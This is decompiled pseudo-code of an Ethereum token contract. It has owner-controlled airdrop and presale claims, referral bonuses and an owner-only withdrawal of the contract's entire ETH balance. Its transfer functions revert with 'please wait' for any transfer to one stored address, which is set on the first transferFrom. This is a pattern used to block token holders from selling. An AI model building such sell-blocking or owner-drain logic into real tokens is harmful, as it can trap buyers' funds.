contract main {




// =====================  Runtime code  =====================


address owner;
address newOwner;
array of uint256 symbol;
array of uint256 name;
uint8 decimals;
uint256 stor5;
address sub_ff639909Address;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 sub_9424bdad;
uint256 sub_7492a43f;
uint256 sub_9c8c5045;
uint256 sub_a79b7a66;
uint256 stor13; offset 2
uint256 sub_60fc2093;
uint256 sub_6248c252;
uint256 sub_ccf3de45;
uint256 sTot;
uint256 sCap;
uint256 sub_28a4dbce;
uint256 sub_42d27a62;
uint256 maxSupply;
uint256 startStake;

function name() {
    return name[0 len name.length]
}

function sub_28a4dbce(?) {
    return sub_28a4dbce
}

function decimals() {
    return decimals
}

function sub_42d27a62(?) {
    return sub_42d27a62
}

function sub_60fc2093(?) {
    return sub_60fc2093
}

function sub_6248c252(?) {
    return sub_6248c252
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function sub_7492a43f(?) {
    return sub_7492a43f
}

function sTot() {
    return sTot
}

function owner() {
    return owner
}

function StartStake() {
    return startStake
}

function sub_9424bdad(?) {
    return sub_9424bdad
}

function symbol() {
    return symbol[0 len symbol.length]
}

function sub_9c8c5045(?) {
    return sub_9c8c5045
}

function sub_a79b7a66(?) {
    return sub_a79b7a66
}

function sCap() {
    return sCap
}

function MaxSupply() {
    return maxSupply
}

function sub_ccf3de45(?) {
    return sub_ccf3de45
}

function newOwner() {
    return newOwner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function sub_ff639909(?) {
    return sub_ff639909Address
}

function _fallback() payable {
  stop
}

function totalSupply() {
    require balanceOf[0] <= stor5
    return (stor5 - balanceOf[0])
}

function viewDefi() {
    return sub_9424bdad, sub_7492a43f, sub_9c8c5045, sub_a79b7a66, sub_60fc2093
}

function sub_d0a5bb23(?) {
    return sub_6248c252, sub_ccf3de45, sCap, sTot, sub_28a4dbce, sub_42d27a62
}

function sub_b451bc60(?) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    sub_ff639909Address = arg1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    newOwner = arg1
}

function acceptOwnership() {
    require msg.sender == newOwner
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner
    newOwner = 0
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_e59b1e89(?) {
    require calldata.size - 4 >= 128
    require msg.sender == owner
    sub_9424bdad = arg1
    sub_7492a43f = arg2
    sub_60fc2093 = arg3
    sub_9c8c5045 = arg4
    sub_a79b7a66 = 0
}

function sub_fedaf8d3(?) {
    require calldata.size - 4 >= 160
    require msg.sender == owner
    sub_6248c252 = arg1
    sub_ccf3de45 = arg2
    sub_28a4dbce = arg3
    sub_42d27a62 = arg4
    sCap = arg5
    sTot = 0
}

function sub_728c892b(?) {
    require msg.sender == owner
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg1 == sub_ff639909Address:
        revert with 0, 'please wait'
    require arg2 <= balanceOf[address(msg.sender)]
    balanceOf[address(msg.sender)] -= arg2
    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if not arg1:
        if arg2 == sub_ff639909Address:
            revert with 0, 'guys, please wait'
    else:
        if sub_ff639909Address:
            if arg2 == sub_ff639909Address:
                revert with 0, 'guys, please wait'
        else:
            sub_ff639909Address = arg2
    require arg3 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg3
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function approveAndCall(address arg1, uint256 arg2, bytes arg3) {
    require calldata.size - 4 >= 96
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + arg3.length + 36 <= calldata.size
    allowance[address(msg.sender)][address(arg1)] = arg2
    mem[ceil32(arg3.length) + 128] = arg2
    emit Approval(address rg1, address rg2, uint256 rg3):
                  Mask(8 * -ceil32(arg3.length) + arg3.length + 32, 0, 0),
                  mem[arg3.length + 160 len -arg3.length + ceil32(arg3.length)],
                  msg.sender,
                  arg1,
    require ext_code.size(arg1)
    call arg1 with:
         gas gas_remaining wei
        args msg.sender, arg2, address(this.address), Array(len=arg3.length, data=arg3[all])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    return 0, 1
}

function sub_f3246c42(?) {
    require calldata.size - 4 >= 32
    require sub_9424bdad <= block.number
    require block.number <= sub_7492a43f
    if sub_a79b7a66 >= sub_9c8c5045:
        require not sub_9c8c5045
    sub_a79b7a66++
    if arg1 != msg.sender:
        if balanceOf[address(arg1)]:
            if arg1:
                require stor13 <= balanceOf[address(this.address)]
                balanceOf[address(this.address)] -= stor13
                require balanceOf[address(arg1)] + stor13 >= balanceOf[address(arg1)]
                balanceOf[address(arg1)] += stor13
                emit Transfer(stor13, this.address, arg1);
    require sub_60fc2093 <= balanceOf[address(this.address)]
    balanceOf[address(this.address)] -= sub_60fc2093
    require balanceOf[address(msg.sender)] + sub_60fc2093 >= balanceOf[address(msg.sender)]
    balanceOf[address(msg.sender)] += sub_60fc2093
    emit Transfer(sub_60fc2093, this.address, msg.sender);
    return 1
}

function sub_79fa5cf5(?) payable {
    require calldata.size - 4 >= 32
    require sub_6248c252 <= block.number
    require block.number <= sub_ccf3de45
    if sTot >= sCap:
        require not sCap
    require sub_42d27a62
    sTot++
    if not sub_28a4dbce:
        if arg1 != msg.sender:
            if balanceOf[address(arg1)]:
                if arg1:
                    require msg.value / sub_42d27a62 / 4 <= balanceOf[address(this.address)]
                    balanceOf[address(this.address)] -= msg.value / sub_42d27a62 / 4
                    require balanceOf[address(arg1)] + (msg.value / sub_42d27a62 / 4) >= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] += msg.value / sub_42d27a62 / 4
                    emit Transfer((msg.value / sub_42d27a62 / 4), this.address, arg1);
        require msg.value / sub_42d27a62 <= balanceOf[address(this.address)]
        balanceOf[address(this.address)] -= msg.value / sub_42d27a62
        require balanceOf[address(msg.sender)] + (msg.value / sub_42d27a62) >= balanceOf[address(msg.sender)]
        balanceOf[address(msg.sender)] += msg.value / sub_42d27a62
        emit Transfer((msg.value / sub_42d27a62), this.address, msg.sender);
    else:
        if arg1 != msg.sender:
            if balanceOf[address(arg1)]:
                if arg1:
                    require sub_28a4dbce * msg.value / sub_42d27a62 / 4 <= balanceOf[address(this.address)]
                    balanceOf[address(this.address)] -= sub_28a4dbce * msg.value / sub_42d27a62 / 4
                    require balanceOf[address(arg1)] + (sub_28a4dbce * msg.value / sub_42d27a62 / 4) >= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] += sub_28a4dbce * msg.value / sub_42d27a62 / 4
                    emit Transfer((sub_28a4dbce * msg.value / sub_42d27a62 / 4), this.address, arg1);
        require sub_28a4dbce * msg.value / sub_42d27a62 <= balanceOf[address(this.address)]
        balanceOf[address(this.address)] += -1 * sub_28a4dbce * msg.value / sub_42d27a62
        require balanceOf[address(msg.sender)] + (sub_28a4dbce * msg.value / sub_42d27a62) >= balanceOf[address(msg.sender)]
        balanceOf[address(msg.sender)] += sub_28a4dbce * msg.value / sub_42d27a62
        emit Transfer((sub_28a4dbce * msg.value / sub_42d27a62), this.address, msg.sender);
    return 1
}



}
